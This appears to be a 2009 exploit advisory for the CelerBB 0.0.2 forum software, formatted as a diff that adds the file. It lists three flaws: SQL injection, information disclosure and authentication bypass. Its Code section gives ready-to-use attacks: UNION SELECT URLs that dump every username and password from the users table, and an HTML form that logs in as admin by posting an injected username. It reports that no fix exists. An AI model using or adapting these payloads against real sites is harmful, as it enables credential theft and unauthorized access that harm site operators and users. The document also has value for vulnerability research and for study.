@@ -1,0 +1,100 @@
+*******   Salvatore "drosophila" Fresta   *******
+
+[+] Application: CelerBB
+[+] Version: 0.0.2
+[+] Website: http://celerbb.sourceforge.net/
+
+[+] Bugs: [A] Multiple SQL Injection
+          [B] Information Disclosure
+          [C] Authenticaion Bypass
+
+[+] Exploitation: Remote
+[+] Date: 05 Mar 2009
+
+[+] Discovered by: Salvatore "drosophila" Fresta
+[+] Author: Salvatore "drosophila" Fresta
+[+] Contact: e-mail: drosophilaxxx@gmail.com
+
+
+*************************************************
+
+[+] Menu
+
+1) Bugs
+2) Code
+3) Fix
+
+
+*************************************************
+
+[+] Bugs
+
+
+- [A] Multiple SQL Injection
+
+[-] Requisites: magic_quotes_gpc = off
+[-] File affected: viewforum.php, viewtopic.php
+
+This bug allows a guest to view username and
+password list.
+
+
+- [B] Information Disclosure
+
+[-] Requisites: none
+[-] File affected: showme.php
+
+This bug allows a guest to view reserved
+information of any user.
+
+
+- [C] Authentication Bypass
+
+[-] Requisites: magic_quotes_gpc = off
+[-] File affected: login.php
+
+This bug allows a guest to bypass authentication.
+
+
+*************************************************
+
+[+] Code
+
+
+- [A] Multiple SQL Injection
+
+http://www.site.com/path/viewforum.php?id=-1' UNION ALL SELECT 1,2,GROUP_CONCAT(CONCAT(username, 0x3a, password)),4,5,6,7,8 FROM celer_users%23
+
+http://www.site.com/path/viewtopic.php?id=1' UNION ALL SELECT 1,2,3,NULL,5,6,GROUP_CONCAT(CONCAT(username, 0x3a, password)),NULL FROM celer_users%23
+
+
+- [B] Information Disclosure
+
+http://www.site.com/path/showme.php?user=admin
+
+
+- [C] Authentication Bypass
+
+<html>
+  <head>
+    <title>CelerBB 0.0.2 Authentication Bypass Exploit</title>
+  </head>
+  <body>
+    <form action="login.php" method="POST">
+      <input type="hidden" name="Username" value="admin'#">
+      <input type="submit" value="Exploit">
+    </form>
+  </body>
+</html>
+
+
+*************************************************
+
+[+] Fix
+
+No fix.
+
+
+*************************************************
+
+# milw0rm.com [2009-03-05]
